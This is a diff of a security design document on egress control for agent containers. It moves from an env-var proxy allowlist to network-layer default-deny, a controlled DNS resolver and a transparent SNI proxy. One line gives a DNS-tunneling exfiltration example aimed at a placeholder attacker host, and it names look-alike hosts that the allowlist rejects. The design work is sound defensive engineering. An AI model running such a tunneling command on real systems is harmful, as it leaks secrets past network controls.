@@ -111,31 +111,29 @@ So the mitigation is two-layered:
   request carries *this user's* session token, not an attacker-supplied one, so an
   allowlisted API can't be used to upload into someone else's account.
 
-**Implementation status (SHI-90, Phase 1 — landed behind `SESSION_EGRESS_PROXY=1`):**
-The orchestrator-controlled forward proxy is built and wired:
+**Design + status:** see **[egress-control.md](./egress-control.md)** for the full design.
+In short: enforcement must happen at the **network layer** (an `internal` network + an
+orchestrator-controlled **gateway middlebox**), not via `HTTP_PROXY` env vars — those are
+honored only by cooperative clients and a raw socket bypasses them, so the env-var proxy
+already on the branch is a policy engine without enforcement. The gateway delivers three
+tiers, built **sequentially in one PR** (one self-contained commit per tier, each green):
 
-- `egress-allowlist.ts` — the host allowlist matcher. A base list
-  (`EGRESS_DEFAULT_ALLOWLIST`: the agent APIs, `.github.com` /
-  `.githubusercontent.com`, npm/yarn/pypi registries) composed with operator extras
-  (`SESSION_EGRESS_ALLOWLIST`) and **live** MCP hosts derived from the credential store
-  (configured HTTP MCP servers' `url` hosts + OAuth-connected providers' `mcpUrl` hosts).
-  Suffix entries (`.github.com`) match the domain and its subdomains; look-alikes
-  (`evilgithub.com`, `github.com.attacker.com`) are rejected.
-- `egress-proxy.ts` — a default-deny forward proxy. Handles HTTPS `CONNECT` tunnels
-  (the dominant path) and absolute-form plain-HTTP proxying; an allowlisted host is
-  forwarded, anything else gets a 403. Wired in `app-lifecycle.ts` mirroring the docker
-  proxy (ephemeral port, advertised via `SessionContainerManager.setEgressProxy`).
-- `container-lifecycle.ts` `buildEnv` injects `HTTP_PROXY`/`HTTPS_PROXY` (+ lower-case
-  forms) and a `NO_PROXY` that bypasses the loopback worker, the orchestrator API, and
-  the docker proxy so ShipIt's own traffic is never routed through (and thus never denied
-  by) the allowlist.
+- **Tier A** — iptables default-deny + `ipset` floor (Anthropic's `init-firewall.sh`
+  pattern: `gh api meta` CIDR for GitHub, resolve-and-pin, `example.com`-must-fail test).
+- **Tier B** — a **controlled DNS resolver** at the gateway that answers only allowlisted
+  names and drives the ipset with the IPs it returns. This is the correction over
+  Anthropic's reference, which leaves **DNS tunneling** open (`dig secret.attacker.com`)
+  and pins stale IPs — disqualifying for our exfil threat model. Minimum tier that actually
+  contains exfil.
+- **Tier C** — a **transparent** SNI/CONNECT proxy (reusing `egress-allowlist.ts`) for
+  hostname-level HTTPS policy, the allow-once / add-to-allowlist inline flow, and the
+  Phase-2 identity hook. Being transparent, it **removes** the `HTTP_PROXY`/`NO_PROXY` env
+  injection currently on the branch.
 
-**Remaining for Gap 1 (follow-ups):** (a) the **network-layer default-deny** that makes
-the proxy the *only* egress route — without it the `HTTP_PROXY` env var is bypassable by a
-raw socket. This is a deployment-topology change (`internal` Docker network + the proxy as
-a reachable NAT gateway) that can't be validated in the unit-test environment, so it ships
-as a documented operator requirement paired with the flag. (b) the **identity-validating
-proxy** (Phase 2) for multi-tenant allowlisted hosts.
+Config moves to the **browser** (default-on global toggle + per-session override +
+allowlist editor), safe to mutate there because SHI-129 default-denies the container from
+the orchestrator API. The **identity-validating proxy** (verify the request carries *this*
+user's token) stays a Phase-2 follow-up on the Tier C hook.
 
 ### Gap 2 — GitHub token is host-blind *and* sits in plaintext in the workspace `.git/config` *(highest priority)*
 
